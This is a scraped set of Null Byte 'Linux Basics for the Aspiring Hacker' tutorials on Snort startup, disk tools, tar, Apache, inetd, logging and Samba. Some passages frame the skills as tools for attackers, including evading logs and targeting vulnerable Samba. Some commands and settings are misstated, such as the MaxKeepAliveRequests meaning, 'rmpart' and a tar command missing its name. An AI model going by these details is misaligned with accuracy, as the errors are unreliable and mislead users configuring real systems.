        "content": "Our Kali, being a Debian-based Linux distribution, usually boots into runlevel 2.\nThe Init.d Process\nInit is the very first process. It is the ancestor of all Linux processes and always has the process ID of 1. As you can see in the screenshot below, init has the PID of 1.\nkali > ps aux | grep init\nThis init process then hands over the boot-up processes to rc.d daemon.\nIt's important to note here that different Linux distributions handle the daemon start-up process slightly differently. In general, they all use the init process as the first process, but how they hand off to the start-up scripts differs slightly. In this case, we will be looking specifically at our Kali Linux which uses the same procedure as other Debian-based Linux systems.\nStep 1: List the init.d Directory\nNow that we have a basic understanding of the boot-up process in Linux, let's see if we can add Snort to the boot-up process in our Kali.\nFirst, let's go to the directory /etc/init.d, the init process daemon directory (not to be confused with inetd). In this directory are all the scripts to start various processes at bootup.\nkali > cd /etc/init.dkali > ls -l\nAs you can see, these are files that can be executed by init upon bootup. Note, for example, apache2. If we go a bit further down the page, we should find rc.local.\nStep 2: Open rc.local with a Text Editor\nNow let's open rc.local in any text editor, which contains a script to start necessary processes in the background when the system boots up. I will be using Leafpad here.\nkali > leafpad /etc/init.d/rc.local\nStep 3: Install Snort\nNow we will see if we can use what we learned to get the Snort IDS to always start at bootup. If don't already have Snort installed, do so now. To do so, you can type:\nkali > apt-get install snort\nThe Snort package will downlaod and install. As part of the install, Snort will place a start-up script in the /etc/init.d directory. Let's look there and confirm.\nkali > ls -l\nAs you can see, Snort has placed a start-up script in the /etc/init.d directory. Now all we need to do is to execute that script each time the system starts.\nIf you compiled Snort from source code, you may not have this script. In that case, simply create a file named \"snort\" and save it to the /etc/init.d directory. In that file, place a command to start Snort such as:\n/usr/sbin/snort -D -c /etc/snort/snort.conf -l /var/log/snort\nMake certain that this script has execute privileges (755).\nStep 4: Strat Snort from rc.local\nThere are many ways to get a script to run at start up, but probably the simplest is to use the rc.local file. As we saw above, the rc.local file contains a script to start various services upon boot. Now all we need to do is append that file with commands to start Snort.\nLet's open that file with Leafpad and add two lines at the end of the file to [1] make certain that the proper interface is up and in promiscuous mode (ifconfig eth0 up -arp) and [2] execute the script that the Snort package placed in the init.d directory (/etc/init.d/snort start).\nNow whenever your system starts, Snort will always start in the background. Let's test it. Reboot your Kali system and let's see whether Snort starts automatically.\nNow that our system has rebooted, let's check to see if Snort is running by typing:\nkali > ps aux | grep snort\nSuccess! Now our network is always protected by Snort whenever we start our system!\nKeep coming back, my neophyte hackers, as we continue to explore the inner workings of Linux to give you the skills to become a professional hacker!",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker: Managing Hard Drives",
        "link": "https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-managing-hard-drives-0167371/",
        "content": "* WonderHowTo\nManaging hard drives in Linux is crucial to understanding your system and its operation as well as understanding the system you are exploiting or conducting a forensic analysis on. Linux has numerous commands that can provide us with information, control, and management of hard drives, and in this tutorial, we will examine a number of the most important ones.\nHard Drive Designations in Linux\nUnlike the C: drive in Windows, Linux does not have a physical drive at its root. Instead, it has a / (slash) at the top (root) of its file system. It then mounts physical drives to this file system either at /mnt or /media.\nLinux uses a logical label for the drives that are then mounted on the file system. These logical labels will vary depending upon when and where they are mounted. This means that the same hard drive might have different labels at different times.\nGenerally, the system for labeling drives starts with:\nThe letters \"hd\" stand for hard drive, and the following letter is the order with which they are mounted. With newer hard drives (SATA), Linux designates them with:\nThe \"s\" is a legacy from SCSI drives. Partitions within those drives are then designated with numbers after the letters such as sda1, sda2, sda3, etc.\nAmong the most basic commands in Linux is df. When we type it, it will provide us with basic information on any hard disks or mounted drives such as CD, DVD, or flash drives. It is usually used to quickly glance at the available space on your drives; that's why \"df\" stands for disk free.\nNote that my virtual disk on this system was designated sda1.\n* sd = SATA drive\n* 1 = first partition of that drive\nAnd my 16 GB flash drive was sdb1 and my external hard drive sdc1.\nStep 2: Fdisk\nThe fdsisk command is often used to determine the partitions on the disk. If we use the -l switch, it will list all the partitions of all of the drives.\nkali > fdisk -l\nAs you can see in the screenshot above, it lists sda1, sda2, and sda3 in the first circled stanza. This is the virtual disk from my virtual machine that this Kali Linux is installed on. Note that it is 25 GB with three partitions including the swap partition (sda3).\nIf we scan a bit down the screenshot to the second stanza, we see a second device output designated sdb1. This is my 16 GB flash drive. Note that fdisk indicates that it is a FAT32 filesystem type.\nLastly, we see sdc1 in the third circled stanza. This is my external 1 TB hard drive. Note that fdisk indicates that it is a NTFS file system.\nStep 3: Lsblk\nIn Linux, devices are categorized as either block or character devices. Character devices are such devices as keyboards and printers. Block devices are hard drives, DVD devices, and flash drives, among others.\nWe have a command, lsblk (list block), that will list some basic information about each of the block devices. It will also display the devices in a kind of tree, showing each device with branches of its partitions. An example would be sda with the branches of sda1, sda2, and sda3.\nkali > lsblk\nNote in the output above, it also includes fd0 (floppy drive) and sr0 (DVD drive). Additional information included here is the mount point of the drive. Note that both of my external USB devices are mounted at /media/root.\nStep 4: Parted\nThe parted command is capable of displaying your partitions and editing them. We can start by simply typing:\nkali > parted\nWhen we do so, it returns an interactive prompt beginning with (parted). From that prompt, we can provide further options and information to parted. For instance, if we wanted to see all the partitions like above, we can type:\n(parted) print\nIf we wanted to see the specific information on a single partion, we can use select followed by the partition. For instance:\nparted select /dev/sdb\nAs you can see, parted then provided us with just the information on that single partition, my FAT32 16 GB flash drive.\nTo remove a partition, simply type rmpart followed by the number of the partition such as:\n(parted) rmpart 5\nWe can use parted to create and edit partitions, but I don't recommend it for beginners—without knowledge and experience, one is likely to cause more damage than good.\nFinally, to leave the interactive mode of parted, type:\n(parted) quit\nStep 5: Hdparm\nhdparm is a powerful utility that enables us to change and edit the parameters of the hard drive. This can be useful in applications such as forensics, but can be very dangerous without sufficient knowledge. I introduce it to you here as we will be using it in my forensics series in the near future.\nAs you can see from the voluminous help page above, hdparm is capable of altering and editing just about any parameter of your hard drive.\nTo become a professional hacker, you must be competent in Linux. I hope this series will continue to develop your Linux skills, thereby assisting you in your goal of becoming a professional hacker.\nKeep coming back, my neophyte hackers!",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker: Archiving & Compressing Files",
        "link": "https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/",
        "content": "* WonderHowTo\nWhen using Linux, we often need to install new software, a script, or numerous large files. To make things easier on us, these files are usually compressed and combined together into a single file with a .tar extension, which makes them easier to download, since it's one smaller file.\nAs a Linux user, we need to understand how to decompress .tar files and extract what is in them. At the same time, we need to understand how to compress and combine these files into a .tar when we need to send files.\nThose of you who come from the Windows world (most of you), are probably familiar with the .zip format. The .zip utility built into Windows lets you take several files and combine them into a single folder, then compress that folder to make it smaller for transferring over the internet or removable storage. The process we are addressing here in this tutorial is the equivalent of zipping and unzipping in the Windows world.\nPreviously: Configuring Apache in Linux\nWhat Is Compression?\nCompression is an interesting subject that I will have to expand upon in another tutorial at a later time. Basically, there are at least two categories of compression: lossy and lossless.\nLossy compression loses the integrity of the information. In other words, the compressed/decompressed file is not exactly the same as the original. This works great for graphics, video, and audio files where a smaller difference in the file is hardly noticed (.mp3 and .jpg are both lossy compression algorithms).\nWhen sending files or software, lossy compression is not acceptable. We must have integrity with the original file when it is decompressed. That's the type of compression we are discussing here (lossless), and it is available from a number of different utilities and algorithms.\n(More on all of this in a later tutorial.)\nStep 1: Tarring Files Together\nIn most cases, when archiving or combining files, the tar command is used in Linux/Unix. Tar stands for tape archive, a reference to the prehistoric days of computing when systems used tape to store data. Tar is used to create one single file from many files. These files are then often referred to as an archive, tar file, or tarball.\nFor instance, say we had three files, nullbyte1, nullbyte2, and nullbyte3. We can clearly see them below when we do a long listing.\nkali > ls -l\nLet's say we want to send all three of these files to a friend. We can combine them together and create a single archive file by using the following command:\nkali > tar -cvf NB.tar nullbyte1 nullbyte2 nullbyte3\nLet's break down that command to better understand:\n* tar is the archiving command\n* -c means create\n* -f write or read from the following file\n* NB.tar is the new file name we want\nThis will take all three files and create a single file, NB.tar, as seen below, when we do another long listing of the directory.\nPlease note the size of the tarball. When the three files are archived, tar uses significant overhead to do so. The sum of the three files before archiving was 72 bytes. After archiving, the tarball has grown to 10,240 bytes. The archiving process has added over 1,000 bytes. Although this overhead can be significant with small files, this overhead becomes less and less significant with larger and larger files.\nWe can then display those files from the tarball by using the tar command, then the -t switch to display the files, as seen below.\nkali > -tvf NB.tar\nWe can then extract those files from the tarball by using the tar command and then the -x switch to extract the files, as seen above.\nkali > tar -xvf NB.tar\nFinally, if we want to extract the files and do so \"silently,\" we can remove the -v switch, and tar extracts the files without showing us any output.\nkali > tar -xf NB.tar\nStep 2: Compressing Files\nTar is capable of taking many files and making them into one archived file, but what if want to compress those files, as well? We have three commands in Linux capable of creating compressed files:\n* gzip (.tar.gz or .tgz)\n* compress (.tar.Z)\nThey all are capable of compressing our files, but they use different compression algorithms and have different compression ratios (the amount they can compress the files).\nLet's try gzip (GNU zip) first, as it is the most commonly used compression utility in Linux. We can compress our NB.tar file by typing:\nkali > gzip NB.*\nNotice that I used the wild card (*) for my file extension meaning that the command should apply to any file that begins with \"NB\" with any file extension. I will use similar notation for the following examples. When we do a long listing on the directory, we can see that it has changed the file extension to .tar.gz, and the file size has been compressed to just 231 bytes!\nWe can then decompress that same file by using the gunzip (GNU unzip) command.\nkali > gunzip NB.*\nWhen we do, the file is no longer saved with the .tar.gz extension, and has now returned to its original size of 10,240 bytes.\nUsing Bzip2\nOne of the other widely used compression utilities in Linux is bzip2. It works similarly to gzip, but with better compression ratios. We can compress our NB.tar file by typing:\nkali > bzip2 NB.*\nAs you can see in the screenshot above, bzip2 has compressed the file down to just 222 bytes! Also note that the file extension now is .tar.bz2.\nTo uncompress the compressed file, use bunzip2 (b unzip 2).\nkali > bunzip2 NB.*\nWhen we do, the file returns to its original size and its file extension returns to .tar.\nUsing Compress\nFinally, we can use the command compress to compress the file. This is probably the least commonly used compression utility, but it is easy to remember.\nkali > compress NB.*\nNote in the screenshot above that the compress utility reduced the size of the file to 395 bytes, almost twice the size of bzip2. Also note that the file extension now is .tar.Z (with a capital Z).\nTo decompress the same file, use uncompress or the gunzip command.\nkali > uncompress NB.*\nStep 3: Untarring & Uncompressing VMware Tools\nNow that we have a basic understanding of these tools, let's use them in a real world example. Many of you, including myself, using VMware Workstation as a virtualization system. It allows you to run many operating systems on a single physical machine. No one does this better than VMWare.\nIf you are using VMware Workstation, you probably know that VMware encourages you to download and install its VMware tools. When you install VMware tools, your guest operating system integrates much better into your host operating system, which includes better graphics performance, drag-and-drop capability, shared folders, and better mouse performance, among other things.\nNow that we have downloaded VMware tools, you can see that it is a tarball and compressed with gzip. We know this because it has file extension of .tar.gz. So, to decompress it and separate each of the files so that we can use them, we can use the following command:\nkali > tar -xvzf VMwareTools-.9.6.2-1688356.tar.gz\nLet's break down that command to better understand:\n* tar is the archiving command\n* -x means extract\n* -z is used to decompress\n* -f directs the command to the file that follows\nWhen we hit enter, the compressed tarball is decompressed and extracted. Hundreds of files are extracted and decompressed from this VMware tarball. Now, we need to only run the script to install these tools.\nArchiving and compressing are key Linux skills that any hacker/administrator must understand when using Linux. We will continue to explore the Linux basics in this series, so keep coming back, my aspiring hackers!",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker: Configuring Apache",
        "link": "https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-configuring-apache-0164096/",
        "content": "* WonderHowTo\nWelcome back, my hacker novitiates!\nIn an earlier Linux Basics tutorial, I had demonstrated the basics of the Apache web server. Since Apache is the world's most widely used web server on the Internet (as of July 2015, Apache was 38%, IIS was 26%, and Nginx is 15%), the more you know about it and understand it, the more success you are likely to have hacking it.\nIn this tutorial, we will examine the basics of how the Apache server is configured. Like nearly every application in Linux or Unix, configuration is done with a plain text configuration file. Apache is no exception. As a result, we will be focused on the apache2.conf file in the /etc/apache2 directory.\nStep 1: Start Apache2\nLet's begin by starting Apache2. We can do it via the GUI by going to Applications -> Kali Linux -> System Services -> HTTP -> apache2 start, as shown below.\nOr start it by the command line, like below.\nkali >service apache2 start\nThis starts the Apache2 daemon and the web server should now be serving our content to the Internet.\nStep 2: Browse to the Server\nTo check to see whether our Apache server is working, let's simply browse to the localhost or 127.0.0.1. If you see the following page, you now know that the server is working properly!\nStep 3: Open the Configuration File\nTo configure Apache, we need to go to the /etc/apache2 directory.\nkali > cd /etc/apache2\nThen, do a long listing on this directory.\nkali > ls -l\nAs you can see, there are several files and directories in this directory. For our purposes now, the most important is the apache2.conf, but also note that we have the ports.conf file and the sites_available directory, which we will be using later in this tutorial, and several other configuration files and directories.\nWe can open apache2.conf in any text editor, but here I will use Leafpad. It can be opened by simply typing:\nkali > leafpad /etc/apache2/apache2.conf\nAs you can see, this opens a plain text file with all the configuration information for our Apache web server. I will attempt to walk you through the key elements of this file in order to configure our server.\nStep 4: ServerRoot\nLet's scroll down past all the comments and get to line #70 where the global configuration section begins. Here we can see that the ServerRoot is configured here. This is the top of the directory tree where the Apache server keeps all its server-related files. Line #84 defines the ServerRoot. We can simply uncomment it if we want to set /etc/apache2 as our ServerRoot. I recommend that you do that.\nStep 5: Timeout\nIn the next section, we have the variables that define the Timeout, KeepAlive, MaxKeepAliveRequests, and KeepAliveTimeout.\n* Timeout: This is the time the server has to fulfill each request. The default setting is 300 which means that server has 300 seconds or 5 minutes to fulfill each request. This is probably too long and can probably be set to around 30 seconds\n* KeepAlive: This means that the server is kept alive for multiple requests from the same client. It is set to \"On\" by default, which means that clients don't have to create a new connection with every request, saving much overhead on the server.\n* MaxKeepAliveRequests: This is the maximum number of seconds between requests from an established connection. If we set this value to 0, then the amount of time is unlimited.\n* KeepAliveTimeout: This is the amount of time between requests that the connection is kept alive.\nI suggest you leave the defaults in all, except the \"Timeout.\" Each situation is different and you may need to change these defaults to tailor performance to your particular environment.\nStep 6: Apache2 User & Groups\nLet's skip down a few lines in the apache2.conf file until we get line #177. Here we can set the Apache2 user and groups. Note in the comment on Line #177 that we can set these variables in the envvars (environment variables) file. We will leave this to a future tutorial, but note that both the User and Group are variables that come from the /etc/apache2/envvars file.\nNext, we can define the AccessFileName in Line #187. This defines where we can go in each directory to find configuration directives.\nThis final section starting on Line #193 here is critical to the security of Apache. These lines make certain that web clients cannot access either the .htaccess or .htpasswd files.\nStep 7: Logging\nThis next section defines how Apache manages the logging.\nIn the first stanza, we address HostNameLookups. This directive tells Apache2 whether it should do a DNS lookup when it logs a connection. By keeping it \"off\" as it is by default, Apache2 performs much better.\nStep 8: Site Available\nNext, let's look at the site_available directory and, most importantly, the default file there. This is often referred to as the default Virtual Hosts file. Open this file by typing:\nkali > leafpad /etc/apache2/site_available/default\nAs you can see, there are three critical areas of this file. The first line defines what port the web server is listening on. Here, it is defined as listening on any interface on port 80 (*:80). The second line defines where email should be sent when there are server problems. By default, it is set to webmaster@localhost. If you are the systemadmin, you may want to set this to your email address (or simply alias this address to yours). The third item might be the most important, the DocumentRoot. It defines where the content for this virtual host will be located, in this case, /var/www. I suggest you leave it as defined here.\nStep 9: Ports\nFinally, for this tutorial, we can navigate down to line #248 of the apache2.conf file and notice that there is an \"include port.conf\" line. This directive simply tells Apache to go to the port.conf file to find ports it should listen on.\nIf we open that file, port.conf, we can see that it is configured to listen on port 80 (line #9). The next section, starting on line #11, checks to see whether the mod_ssl.c module is included, and if it is, opens port 443 (line 17).\nIf we want to change the ports for either HTTP or HTTPS, we can do that here by simply replacing the port numbers in this file.\nStep 10: Restart the Apache Server\nNow that we have any changes to our Apache2 configuration, we need to restart the server for them to take place.\nkali > service apache2 restart\nNow we know a bit more about probably the most important Linux application, Apache Web Server. We will continue to expand your hacker horizons with more Linux Basics for the Aspiring Hacker, so keep coming back, my hacker novitiates!",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 25 (Inetd, the Super Daemon)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-25-inetd-super-daemon-0161794/",
        "content": "* WonderHowTo\nWelcome back, my rookie hackers!\nIn my ongoing attempts to familiarize aspiring hackers with Linux (nearly all hacking is done with Linux, and here's why every hacker should know and use it), I want to address a rather obscure, but powerful process. There is one super process that is called inetd or xinetd or rlinetd. I know, I know... that's confusing, but bear with me.\nBefore I discuss the inetd process, I want to explain that in Linux and Unix, processes that run in the background are called daemons. In some places, you we will even see them referred to as \"demons,\" but that is incorrect. A daemon is a spirit that influences one's character or personality. They are not representatives of good or evil, but rather encourage independent thought and will. This is in contrast to a \"demon,\" which we know is something quite different.\nImage via Unknown\nNow, back to inetd. In the beginning—well, at least in the beginning of Unix—all daemons started at boot time and ran continuously. As you might imagine, this meant that processes that were not being used were using resources and depleting performance. This obviously was an inefficient way of doing business.\nAs systems gained more and more services, it became readily apparent that something different needed to be done. As a result, a programmer at Berkeley decided that it might be best to create a daemon that would control all other daemons, a sort of super daemon. Thus, began inetd, or the Internet daemon.\nInetd always runs in the background and it then decides when to start and stop other daemons. So, if a call comes in on port 21 for FTP services, inetd starts the FTP daemon. When a call comes in on port 80 for HTTP services, inetd starts HTTP services, and so on. In this way, inetd conserves resources and improves overall system performance.\nEventually, this super daemon was exploited by hackers (imagine that) in a number of ways. If you think about it, if I can exploit the super daemon that controls all of the other daemons, I can control the entire system. At the very least, if I can control the super daemon, I can probably DoS the system. This is exactly what did happen and, as a result, we got a new and improved super daemon called xinetd.\nXinetd was developed to address some of the security vulnerabilities in inetd and was rather rapidly adopted by the commercial Linux distributions, Red Hat and SUSE. Debian and Ubuntu, which are the underlying Linux distributions of Kali and BackTrack, respectively, stayed with the older inetd, initially. But now Debian has transitioned to a newer version of inetd, labelled rlinetd.\nFind Rlinetd\nWe can find rlinetd in our Kali system by typing the following.\nkali > locate rlinetd\nWe can see at the top of the list, the configuration file for rlinetd and the daemon file itself.\nRlinetd Manual\nAs I mentioned in earlier articles, whenever we want to know something about a particular command in Linux, we can, of course, Google it. Alternatively, we can also use the man, or manual, file. We simply type \"man\" before the command and the system will pull up the manual file for that command. Let's check out the manual for rlinetd.\nkali > man rlinetd\nTake a Look at rlinetd.conf\nFinally, let's take a look at the configuration file for rlinetd. Let's open it with Leafpad or any text editor.\nkali > leadpad rlinetd\nWe can make our Linux system more secure by setting some default values in the rlinetd.conf file. For instance, if the system were only used for FTP services, it not only would be inefficient to run any other service, but also less secure. For example, if an attacker were trying to exploit HTTP and HTTP was disabled in the rlinetd.conf, they would not have much luck.\nWe could also change the rlinetd.conf to only start FTP services as needed and nothing else. If you only want this system accessible to a list of IP addresses or just your internal network, you could configure that access in the rlinetd.conf.\nAs a beginner with Linux, I recommend not making any changes to the rlinetd as you are more likely to sabotage and disable your system than making it more secure or efficient, but now you understand what inetd is. With more system admin experience, you can manage this super daemon to make your system safer and more efficient.\nDon't Confuse Inetd with Init.d\nLinux novices often confuse init.d and inetd. Init.d is an initialization daemon that runs when the system starts up. It determines the runlevel and the daemons that activate at start up. When a computer is turned on, the kernel starts the systems init.d, which always has a Process ID (PID) of 1.\nThe init process starts a series of scripts that get the system ready for use. These are things such as checking the filesystem and then mounting it and starting any system daemons that are required. These scripts are often referred as rc files because they all begin with the rc.(run command). I'll explain more on init.d in a subsequent tutorial, but I wanted to make certain that this distinction was clear.\nKeep coming back, my rookie hackers, as we explore further the inner workings of Linux and prepare you to be professional hackers!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 24 (The Linux Philosophy)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-24-the-linux-philosophy-0160641/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nAlthough this article may have been better placed first in this series, I doubt that anyone would have read it when just starting out studying Linux. Now, that you are well into your Linux studies and have some familiarity with how it operates, I'd like to take this moment to explain the philosophy around the Linux operating system.\nWhen I use the term \"philosophy,\" I am not referring to such questions as \"what is the meaning of life\" or \"does God exist,\" but rather what was the underlying logic and reasoning behind the design of this ubiquitous and love-lived operating system.\nAs many of you already know, I am strong advocate for the Linux operating system. This is for a multitude of reasons that I have tried to explain in this article. Although Linux may be ideally suited to hacking and many other applications, I think it is important to understand the philosophy underlying the Linux/Unix structure and model for any environment.\nIn this article, I will use the term Unix/Linux to designate this operating system. Unix was the original, developed by Thompson and Ritchie, and Linux was a re-engineer of Unix by Linux Torvalds and team. Mac OS X, iOS, Android, Solaris, AIX, HP-UX, and IRIX are all forms of Unix/Linux.\nIn addition, Red Hat, Ubuntu, Mint, Fedora, Debian, Slackware, and SUSE are all distributions of Linux. A distribution of Linux is simply an operating system that uses the Linux kernel, but then adds in its own additional components. These components vary, but may include applications, utilities, modules, the GUI, and others.\nThis variability in the distributions is often confusing and frustrating to the novice, but it is actually part of the Linux beauty and strength. Unix/Linux are designed to be flexible and portable, allowing the end-user to work the way they are comfortable, rather than the way the software developer thinks you should work.\nUnix was first developed in the early 1970s by Dennis Ritchie and Ken Thompson at AT&T Labs. The fact that it is still being used over 40 years later tells you something about the quality, durability, and efficiency of this operating system. These guys did something right! How many things in computing are still around from the early 1970s?\nIf anything, rather than this \"ancient\" operating system fading away, it is gaining ground nearly every day. Chrome, Android, iOS, Linux, and Mac OS X are all based on this 40-year-old operating system. If we look at the fastest growing market—mobile devices—it is dominated by Unix variants with iOS and Android compromising over 91% of the market. It appears that the mobile market in the near future will be nearly 100% Unix/Linux.\nWhat about this modest operating system has made it this durable and long-lasting? Let's take a look then at some of the tenants of this design philosophy that has made Linux so successful.\nAssume the User Is Computer Literate\nThe developers of Unix (and thereby Linux) made a radical assumption: That the users are computer literate. We can't say the same for many other operating systems. In many cases, the operating system developers assume we are ignorant, illiterate Neanderthals who need to be protected ourselves. Not so with Unix/Linux.\nAs one sage said, \"Unix(Linux) was not designed to stop its users from doing stupid things as that would also keep them from doing clever things.\"\nPerfect! Could not have said it better myself!\nComplete Control\nOne of key reasons that hackers use Linux and only Linux, is that it gives us complete control. Other operating systems try to hide some of their operations and features from us, afraid we will screw things up. Linux is totally transparent and enables us to see and use everything.\nChoose Portability Over Efficiency\nUnix was the first portable operating system, meaning it could be used on many different hardware platforms. This has served it well as Unix/Linux has now been ported and compiled for over near 60 hardware platforms. This has been a critical element in its longevity and ability to adopt to an ever-changing technological environment.\nStore Data in Flat Text Files\nUnix/Linux stores data in flat text files unlike other operating systems. This makes the data as portable, or more portable, than the code itself. Nearly all systems can import and use flat text files.\nUse Shell Scripts to Increase Leverage & Portability\nShell scripts enhance the power of our applications. By writing a script, we can automate an application to do something as many times as we would like, as well as leverage the capabilities of other applications simultaneously. In addition, these scripts are then portable to other systems without having to recompile them.\nAllow the User to Tailor Their Environment\nUnix/Linux was designed to allow the user to tailor their environment to their liking. The user is in control and not the software developer. Unix/Linux implements mechanisms for doing things, but they don't dictate how you do things. This tailoring can take many forms including the graphical user interface (GUI) . There are numerous GUIs available for Linux including GNOME (the default on Kali and the most widely used), KDE, Unity (Ubuntu's default), Sugar, Trinity, Xfce, Enlightenment, and many more. In most cases, despite the default GUI that might come with your system, you can install and use any one of the other interfaces, if you please.\nMake the Kernel Small & Lightweight\nAlthough many operating system kernels continue to add features to the main kernel to offer users greater capability, they make it more and more bloated. The Unix/Linux model is to keep the kernel small and lightweight, but allow the developers and users to add components and modules as they please.\nUser Lowercase & Keep It Short\nlowercase names and commands are a unix/linux tradition.\nSilence Is Golden\nUnix/Linux commands tend to be silent when you have done things correctly. This can drive some new users a bit batty when they, for instance, copy a file from one location to another and Unix/Linux has nothing to say. Not a confirmation or even a pat on the back.\nThink Hierarchically\nThe Unix/Linux operating system was the first to develop a file system organized into a hierarchical tree. This hierarchical thinking has extended into many other areas of the operating system, such as networking and object-oriented programming.\nI hope this little foray into the philosophy of Linux helps you to understand why Linux is so different than those other operating systems. The result of this philosophy is an operating system that is small, lightweight, and flexible, which treats all users with respect.\nCover image via Ken FUNAKOSHI/Flickr",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 23 (Logging)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-23-logging-0160347/",
        "content": "* WonderHowTo\nWelcome back, my amateur hackers!\nWhen you are using and administering Linux, it is important to be conversant in the use of the log files. As you know, log files are the repository for much information about our system, including errors and security alerts.\nIf we are trying to secure Linux, it is crucial to know how to manage the logging functions to be able to know if your system has been attacked, and to then decipher what actually happened and who did it. If you are the attacker, it is crucial to understand what information can be gathered about you and your methods from these same log files so you can avoid leaving any trace behind.\nGenerally, Linux uses a daemon (a program that runs in the background) called syslogd that is a unified system for logging events on your computer. Several variations of syslog exist, including rsyslog and syslog-ng. Although they operate very similarly, they do have some minor differences. Since our Kali Linux is built on Debian, it comes with rsyslog by default, so that is what we will be using in this tutorial.\nStep 1: Open a Terminal in Kali\nLet's begin by opening a terminal in terminal. To find our rsyslog, we can simply type:\nkali > locate rsyslog\nStep 2: Open the Rsyslog Configuration File (rsyslog.conf)\nLike nearly every application in Linux, rsyslog is managed and configured by a plain text configuration file. As you hopefully learned in earlier Linux tutorials, generally, configuration files are located in the /etc directory. In the case of rsyslog, it is located at /etc/rsyslog.conf. Let's open that file with any text editor (here I will use Leafpad).\nkali > leafpad /etc/rsyslog.conf\nAs you can see above, the rsyslog.conf file comes well documented with numerous comments explaining its use.\nStep 3: Format of the Rsyslog Configuration File\nLet's navigate down a bit to below Line 50. Here begins the \"Rules\" section. This is where we can set the rules for what Linux logs.\nThe basic format for these rules is:\nfacility.priority action\nThe facility word references the program (such as mail, kernel, lpr, etc.) that generates the message to be logged. The priority keyword references the importance of the log message. Finally, the action keyword references the location that the log is to be sent to. This can be a file, remote computer, etc.\nThe valid codes to put in place of the facility keyword in our configuration file rules include:",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 22 (Samba)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-22-samba-0158534/",
        "content": "* Name resolution\n* Service announcement (browsing)\nSamba functionality is implemented by two daemons, smbd and nmbd. These daemons (services) are installed and run on nearly every distribution of Unix and Linux. Samba, like Windows NetBios/SMB, runs on ports 135, 137, and 445.\nJust like Window's SMB, Linux's Samba has been one of the weakest and most often exploited protocols. There is a long list of vulnerabilities and exploits that take advantage of Linux's Samba, and when I want to exploit a Linux system, one of the first things I test is Samba. Samba 3.6.3 and earlier versions allow anonymous users to gain root access through Samba 's remote procedure call.\nThe more we know and understand Samba, the better network admin's we will be and the better Linux hackers we will be. Let's take a little time to understand this essential and, often, very vulnerable protocol in Linux.\nStep 1: Locate Samba\nTo find Samba files in our Kali, let's just type:\n* locate smb\nWhen you do so, you will see dozens of files with SMB or Samba in their name, including numerous Metasploit modules for exploiting Samba. Near the top of that list is the main configuration file for Samba, /etc/samba/smb.conf. Like nearly every application or daemon in Linux, there is a configuration file located in the /etc directory. These are simple text files that can be edited and saved to alter the configuration of the application or daemon. Samba is no different.\nLet's open that now with the text editor of your choice. In this case, I'll use Leafpad in Kali.\n* kali > leafpad /etc/samba/smb.conf\nAs you can see, this configuration file is well commented. For more information on configuring Samba, you can also type:\n* kali > man samba\nI should point out now that this configuration file uses two different types of comments. The first is the all familiar \"#\" , but it also the uses \";\" too. You will see both in this configuration file.\nStep 2: Configure Samba\nSamba has a command that allows you to test the syntax of your configuration file. This is:\n* kali > testparm -v\nWhen you type this command, it checks your parameters and syntax to see whether they are workable.\nIt is important to note that whenever you make changes to this configuration file, you must restart Samba for them to be implemented. You can do this with:\n* kali > service smb restart\nStep 3: Create a Samba User\nSamba has its own password authentication system. You can create users with access to Samba, if they exist, in the /etc/passwd file (in other words, they are a user on the system) with the command:\n* kali > smbpasswd -a <username>\nAs you can see, I have added myself, OTW, to the Samba user list with my password.\nStep 4: Setting the WorkGroup\nIf you want to connect to the workgroup from a Windows machine, you will need the name of the Windows workgroup. In the \"Global Settings,\" you can see the default is set to workgroup but, of course, this should set to the name of the Windows workgroup that Samba will be connected to.\nStep 5: Accounting/Logging\nNext, let's navigate down within the Global Settings to the \"Debugging/Accounting\" section.\nHere you can see we can set the location of the log file:\n* log file = /var/log/samba/log.%m\nThe maximum log size (KB):\n* max log size = 1000\nAnd whether to only use syslog to centralize our logging to a dedicated logging system:\n* syslog only = no\nAmong many other things.\nStep 6: Authentication\nIf we navigate a bit lower in the Global Settings, we come to the \"Authentication\" section.\nHere we can set what type of server Samba will be:\n* server role = standalone server\nWhether Samba should obey/use pluggable authentication modules (PAM):\n* obey pam restrictions = yes\nWhether Samba syncs passwords with the Linux/Unix password system:\n* unix password sync = yes\nAnd finally, how Samba handles password setting.\nStep 7: Samba Variables\nYou will notice that throughout the Samba configuration file, variables are used that begin with \"%\". For instance, in the logging section above, we saw this line:\n* log file = /var/log/samba/log.%m\nThe \"%m\" at the end represents a variable. If we use the table below, we can see that the \"%m\" represents the \"The client's NetBIOS name.\" If the NetBIOS name of the computer were \"NullByte,\" this would mean that the logs would be found for that system at:\n* log file = /var/log/samba/log.NullByte\nWhen we replaced the variable with the value of the NetBIOS name.\nAlthough there are far more changes we can make to this configuration file, in many cases the default setting will suffice in most circumstances, although not optimally. I'll be doing a second Samba tutorial in the near future where we will configure Samba for optimal file sharing, so keep coming back, my aspiring hackers.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 21 (GRUB Bootloader)",
